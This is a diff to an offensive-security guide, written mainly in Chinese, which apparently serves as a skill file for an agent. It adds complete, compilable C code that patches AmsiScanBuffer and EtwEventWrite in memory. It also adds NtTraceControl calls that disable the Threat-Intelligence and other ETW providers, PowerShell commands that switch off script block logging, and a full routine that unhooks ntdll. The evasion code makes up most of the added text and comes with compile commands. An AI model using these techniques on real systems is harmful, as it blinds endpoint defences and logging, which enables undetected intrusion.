@@ -51,31 +51,225 @@ powershell -Version 2
 # Obfuscated to avoid static detection — see AMSI_BYPASS_TECHNIQUES.md for full patterns
 ```
 
+### C Language AMSI Patch (Complete Implementation)
+
+```c
+/**
+ * 完整 C 语言 AMSI 绕过 — Patch AmsiScanBuffer 返回 E_INVALIDARG
+ * 编译: x86_64-w64-mingw32-gcc -O2 patch_amsi.c -o patch_amsi.exe
+ *
+ * 原理: patching amsi.dll!AmsiScanBuffer 的前几个字节，
+ *       使其直接返回 0x80070057 (E_INVALIDARG)，
+ *       AMSI 调用方收到该返回值后会跳过扫描。
+ */
+
+#include <windows.h>
+#include <stdio.h>
+
+BOOL PatchAmsiScanBuffer() {
+    HMODULE hAmsi = LoadLibraryA("amsi.dll");
+    if (!hAmsi) {
+        printf("[-] LoadLibrary(amsi.dll) failed\n");
+        return FALSE;
+    }
+
+    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    if (!pAmsiScanBuffer) {
+        printf("[-] GetProcAddress(AmsiScanBuffer) failed\n");
+        return FALSE;
+    }
+
+    printf("[+] AmsiScanBuffer @ 0x%p\n", pAmsiScanBuffer);
+
+    DWORD oldProtect = 0;
+    SIZE_T patchSize = 6; // x64: 6 bytes
+
+#ifdef _WIN64
+    // x64: mov eax, 0x80070057; ret
+    //     B8 57 00 07 80    mov eax, 0x80070057
+    //     C3                ret
+    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+#else
+    // x86: mov eax, 0x80070057; ret 0x18
+    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+    patchSize = 8;
+#endif
+
+    if (!VirtualProtect(pAmsiScanBuffer, patchSize,
+                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    memcpy(pAmsiScanBuffer, patch, patchSize);
+
+    DWORD dummy;
+    VirtualProtect(pAmsiScanBuffer, patchSize, oldProtect, &dummy);
+
+    printf("[+] AmsiScanBuffer patched successfully\n");
+    return TRUE;
+}
+
+// 验证: 调用后 PowerShell 的 AMSI 扫描将全部返回 AMSI_RESULT_CLEAN
+```
+
+### Patchless AMSI Bypass（硬件断点 — 最高级别无痕）
+
+2025-2026年最高级的用户态绕过方案，完全不修改任何内存字节：
+
+```c
+/**
+ * 使用硬件断点（DR0）+ VEH 实现无痕 AMSI 绕过
+ * - 在 AmsiScanBuffer 入口设置硬件断点
+ * - VEH 处理器捕获断点异常后修改 RAX = E_INVALIDARG
+ * - 跳过函数体执行，直接返回
+ * - 全程不修改任何内存字节，不调用 VirtualProtect
+ * - EDR 内存完整性检测无法发现
+ */
+// 详细实现见 advanced-process-injection skill 的 Sleep Obfuscation 章节
+// 或参考 KazuLoader v3 (Turla APT) 的硬件断点技术方案
+```
+
+**C# / PowerShell 版本** — 见 `AMSI_BYPASS_TECHNIQUES.md`
+
 ---
 
 ## 2. ETW BYPASS
 
-ETW (Event Tracing for Windows) feeds telemetry to EDR. Patching `EtwEventWrite` stops .NET assembly load events.
+ETW (Event Tracing for Windows) 向 EDR/SIEM 上报 .NET 程序集加载、PowerShell 脚本块、进程创建等遥测数据。**仅绕过 AMSI 不够，必须同时处理 ETW。**
 
-### Patch EtwEventWrite
+### 2.1 Patch EtwEventWrite（C 语言完整实现）
 
-```csharp
-// C# — patch EtwEventWrite to return immediately
-var ntdll = GetModuleHandle("ntdll.dll");
-var etwAddr = GetProcAddress(ntdll, "EtwEventWrite");
-// Write: ret (0xC3) to first byte
-VirtualProtect(etwAddr, 1, 0x40, out uint oldProtect);
-Marshal.WriteByte(etwAddr, 0xC3);
-VirtualProtect(etwAddr, 1, oldProtect, out _);
+```c
+/**
+ * 完整 C 语言 ETW 绕过 — Patch ntdll!EtwEventWrite
+ * 将所有用户态 ETW 事件静默丢弃
+ * 编译: x86_64-w64-mingw32-gcc -O2 patch_etw.c -o patch_etw.exe
+ */
+
+#include <windows.h>
+#include <stdio.h>
+
+BOOL PatchEtwEventWrite() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return FALSE;
+
+    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
+    if (!pEtwEventWrite) {
+        printf("[-] GetProcAddress(EtwEventWrite) failed\n");
+        return FALSE;
+    }
+
+    printf("[+] EtwEventWrite @ 0x%p\n", pEtwEventWrite);
+
+    DWORD oldProtect = 0;
+
+    if (!VirtualProtect(pEtwEventWrite, 1,
+                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        return FALSE;
+    }
+
+    // 写入单字节 RET (0xC3)，函数立即返回而不上报任何事件
+    *(BYTE *)pEtwEventWrite = 0xC3;
+
+    DWORD dummy;
+    VirtualProtect(pEtwEventWrite, 1, oldProtect, &dummy);
+
+    printf("[+] EtwEventWrite patched — all user-mode ETW events suppressed\n");
+    return TRUE;
+}
+
+// 同样可以 patch EtwEventWriteFull（更完整的 ETW 写入路径）:
+// GetProcAddress(hNtdll, "EtwEventWriteFull") → 同样写入 0xC3
 ```
 
-### PowerShell ETW Bypass
+### 2.2 ETW 深度绕过（2025-2026 对抗升级）
+
+> **背景**: Windows 11 24H2 新增了 `Microsoft-Windows-Threat-Intelligence` ETW Provider，通过独立安全通道传输，不经过用户态可 patch 的 EtwEventWrite 路径。仅 patch EtwEventWrite 无法阻止 Threat Intel 事件上报。
+
+#### 2.2.1 ETW Provider 级选择性禁用
+
+```c
+/**
+ * 使用 NtTraceControl 禁用特定 ETW Provider
+ * 比全局 patch EtwEventWrite 更隐蔽 — 只影响目标 Provider
+ * 需要 SeSystemProfilePrivilege 或管理员权限
+ *
+ * 关键 Provider GUID:
+ * - Microsoft-Windows-Threat-Intelligence: {F4E1897C-BB5D-5668-F1D8-040F4D8DD344}
+ * - Microsoft-Windows-DotNETRuntime:      {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}
+ * - Microsoft-Windows-PowerShell:         {A0C1853B-5C40-4B15-8766-3CF1C58F985A}
+ * - Microsoft-Windows-Kernel-Process:     {22FB2CD6-0E7B-422B-A0C7-2FAD1FD0E716}
+ */
+
+#ifndef EVENT_TRACE_CONTROL_DISABLE_PROVIDER
+#define EVENT_TRACE_CONTROL_DISABLE_PROVIDER 5
+#endif
+
+typedef NTSTATUS (NTAPI *pNtTraceControl)(
+    ULONG FunctionCode, PVOID InBuffer, ULONG InBufferLen,
+    PVOID OutBuffer, ULONG OutBufferLen, PULONG BytesReturned
+);
+
+BOOL DisableETWProvider(LPCGUID providerGuid) {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    pNtTraceControl fnNtTraceControl =
+        (pNtTraceControl)GetProcAddress(hNtdll, "NtTraceControl");
+
+    if (!fnNtTraceControl) return FALSE;
+
+    // FunctionCode = 5 → DisableProvider
+    NTSTATUS status = fnNtTraceControl(
+        EVENT_TRACE_CONTROL_DISABLE_PROVIDER,
+        (PVOID)providerGuid, sizeof(GUID),
+        NULL, 0, NULL
+    );
+
+    return (status == 0);
+}
+
+// 使用: DisableETWProvider(&ThreatIntelProviderGuid);
+```
+
+#### 2.2.2 ETW Session 操作 — EtwNotificationUnregister
+
+```c
+/**
+ * 通过 EtwNotificationUnregister 移除已注册的 ETW 通知回调
+ * 这比 patch EtwEventWrite 更根本 — 从根源上取消事件订阅
+ *
+ * 原理: EDR 通过 EtwRegister/EtwNotificationRegister 注册事件回调。
+ *       EtwNotificationUnregister 可以移除这些回调。
+ *       需要知道 EDR 注册时使用的 NotificationHandle。
+ *
+ * 注意: 此方法需要逆向 EDR 进程获取 NotificationHandle，
+ *       不如 Provider 禁用方案实用。列为高级参考。
+ */
+```
+
+#### 2.2.3 PowerShell ETW 禁用（脚本层）
 
 ```powershell
-# Disable Script Block Logging (ETW provider)
-[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')
-# Set internal field to disable ETW tracing
+# 方法 1: 反射禁用 Script Block Logging
+$settings = [Ref].Assembly.GetType(
+    'System.Management.Automation.Utils'
+).GetField('cachedGroupPolicySettings', 'NonPublic,Static')
+$settings.SetValue($null, [PSObject].new())
+
+# 方法 2: 禁用 ETW 会话（需要管理员权限）
+logman stop "Microsoft-Windows-PowerShell/Operational" -ets 2>$null
+logman stop "EventLog-Microsoft-Windows-PowerShell/Operational" -ets 2>$null
 ```
+
+#### 2.2.4 ETW 绕过方案速查
+
+| 方案 | 覆盖范围 | 检测风险 | 适用场景 |
+|---|---|---|---|
+| **Patch EtwEventWrite** (§2.1) | 所有用户态 ETW 事件 | 中（内存完整性检测） | 通用首选 |
+| **Provider 选择性禁用** (§2.2.1) | 目标 Provider 事件 | 低（无内存修改） | 需精确控制的事件类型 |
+| **EtwNotificationUnregister** (§2.2.2) | 目标会话 | 高（需逆向 EDR） | 高级定制场景 |
+| **PS 反射禁用** (§2.2.3) | PowerShell 日志 | 低 | 仅 PS 脚本场景 |
+| **Patch EtwEventWriteFull** | 完整 ETW 写入路径 | 中 | 配合 EtwEventWrite 双杀 |
 
 ---
 
@@ -191,16 +385,163 @@ Direct: User code → syscall instruction → kernel (bypasses hook)
 | **HalosGate** | Resolve from neighboring unhooked syscalls | Handles partial hooks |
 | **TartarusGate** | Extended HalosGate | More robust resolution |
 
-### Fresh ntdll Copy
+### Fresh ntdll Copy（完整 C 实现）
 
-```csharp
-// Read clean ntdll.dll from disk
-byte[] cleanNtdll = File.ReadAllBytes(@"C:\Windows\System32\ntdll.dll");
-// Or from KnownDlls: \KnownDlls\ntdll.dll
-// Or from suspended process (create sacrificial process, read its ntdll)
+```c
+/**
+ * 从磁盘 KnownDlls 读取干净 ntdll.dll 并覆盖内存中被 Hook 的 .text 段
+ * 编译: x86_64-w64-mingw32-gcc -O2 unhook_ntdll.c -o unhook_ntdll.exe
+ *
+ * 原理: EDR 通过修改内存中的 ntdll.dll .text 段来 Hook 系统调用。
+ *       从磁盘读取干净的 ntdll.dll，将其 .text 段覆盖回内存，
+ *       彻底清除所有用户态 Hook。
+ *
+ * 关键: 必须从 \\KnownDlls\\ 读取（而非 System32），
+ *       KnownDlls 是内核维护的内存映射，EDR 无法修改。
+ */
 
-// Overwrite hooked .text section with clean copy
-// → All EDR hooks in ntdll are removed
+#include <windows.h>
+#include <stdio.h>
+
+/**
+ * 获取当前进程 ntdll.dll 的模块信息
+ * 通过 PEB 遍历 LDR 链表 — 不依赖任何 Hook 敏感 API
+ */
+HMODULE GetNtdllBase() {
+    // x64: 通过 GS 段寄存器偏移 0x60 获取 PEB
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+    PPEB_LDR_DATA pLdr = pPeb->Ldr;
+
+    // 遍历 InMemoryOrderModuleList
+    PLIST_ENTRY head = &pLdr->InMemoryOrderModuleList;
+    PLIST_ENTRY entry = head->Flink;
+
+    while (entry != head) {
+        PLDR_DATA_TABLE_ENTRY pEntry =
+            CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY,
+                              InMemoryOrderLinks);
+
+        // 检查模块名是否为 ntdll.dll
+        if (pEntry->BaseDllName.Length > 0) {
+            WCHAR *name = pEntry->BaseDllName.Buffer;
+            if (_wcsicmp(name, L"ntdll.dll") == 0) {
+                return (HMODULE)pEntry->DllBase;
+            }
+        }
+        entry = entry->Flink;
+    }
+    return NULL;
+}
+
+BOOL UnhookNtdll() {
+    // 1. 获取当前进程中的 ntdll 基址
+    HMODULE hNtdll = GetNtdllBase();
+    if (!hNtdll) {
+        printf("[-] GetNtdllBase() failed\n");
+        return FALSE;
+    }
+    printf("[+] ntdll.dll base @ 0x%p\n", hNtdll);
+
+    // 2. 从 \KnownDlls\ntdll.dll 读取干净副本
+    //    KnownDlls 是内核维护的 Section 对象，EDR 无法修改
+    HANDLE hFile = CreateFileA(
+        "\\\\.\\GLOBALROOT\\KnownDlls\\ntdll.dll",
+        GENERIC_READ, FILE_SHARE_READ, NULL,
+        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
+    );
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        // 回退到 System32（如果 KnownDlls 不可用）
+        hFile = CreateFileA(
+            "C:\\Windows\\System32\\ntdll.dll",
+            GENERIC_READ, FILE_SHARE_READ, NULL,
+            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
+        );
+    }
+
+    if (hFile == INVALID_HANDLE_VALUE) {
+        printf("[-] Cannot open ntdll.dll: %lu\n", GetLastError());
+        return FALSE;
+    }
+
+    DWORD fileSize = GetFileSize(hFile, NULL);
+    BYTE *cleanNtdll = (BYTE *)HeapAlloc(
+        GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize
+    );
+
+    DWORD bytesRead;
+    ReadFile(hFile, cleanNtdll, fileSize, &bytesRead, NULL);
+    CloseHandle(hFile);
+    printf("[+] Loaded clean ntdll.dll: %lu bytes\n", fileSize);
+
+    // 3. 手动解析 PE 头，定位 .text 段
+    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)cleanNtdll;
+    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(cleanNtdll + pDos->e_lfanew);
+    PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
+
+    LPVOID textAddr = NULL;
+    DWORD textSize = 0;
+    LPVOID textRawData = NULL;
+    DWORD textRawSize = 0;
+
+    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
+        if (memcmp(pSec[i].Name, ".text", 5) == 0) {
+            textAddr = (LPVOID)((UINT_PTR)hNtdll + pSec[i].VirtualAddress);
+            textSize = pSec[i].Misc.VirtualSize;
+            textRawData = cleanNtdll + pSec[i].PointerToRawData;
+            textRawSize = pSec[i].SizeOfRawData;
+            break;
+        }
+    }
+
+    if (!textAddr || !textRawData) {
+        printf("[-] .text section not found\n");
+        HeapFree(GetProcessHeap(), 0, cleanNtdll);
+        return FALSE;
+    }
+
+    printf("[+] .text section: VA=0x%p, Size=0x%lx\n",
+           textAddr, textSize);
+
+    // 4. 覆盖内存中的 .text 段为干净版本
+    DWORD oldProtect;
+    if (!VirtualProtect(textAddr, textSize,
+                         PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        printf("[-] VirtualProtect failed: %lu\n", GetLastError());
+        HeapFree(GetProcessHeap(), 0, cleanNtdll);
+        return FALSE;
+    }
+
+    memcpy(textAddr, textRawData, textRawSize);
+
+    DWORD dummy;
+    VirtualProtect(textAddr, textSize, oldProtect, &dummy);
+
+    printf("[+] ntdll.dll .text section restored — all EDR hooks removed\n");
+
+    HeapFree(GetProcessHeap(), 0, cleanNtdll);
+    return TRUE;
+}
+
+// 使用:
+// int main() {
+//     UnhookNtdll();
+//     // 此时所有 ntdll 函数已恢复为原始版本
+//     // 后续所有通过 ntdll 的系统调用不再经过 EDR Hook
+//     ...
+// }
+```
+
+**验证 Unhooking 是否成功**:
+```c
+// Patch 完成后，查看 NtAllocateVirtualMemory 的前 4 字节
+// 原始版本: 4C 8B D1 B8 (mov r10, rcx; mov eax, SSN)
+// Hook 版本: 通常包含 E9 (JMP) 或 FF 25 (JMP [mem])
+BYTE *pNtAlloc = GetProcAddress(GetModuleHandleA("ntdll.dll"),
+                                "NtAllocateVirtualMemory");
+printf("NtAllocateVirtualMemory entry: %02X %02X %02X %02X\n",
+       pNtAlloc[0], pNtAlloc[1], pNtAlloc[2], pNtAlloc[3]);
+// 如果输出 4C 8B D1 B8 → Unhooking 成功
 ```
 
 ### Indirect Syscalls
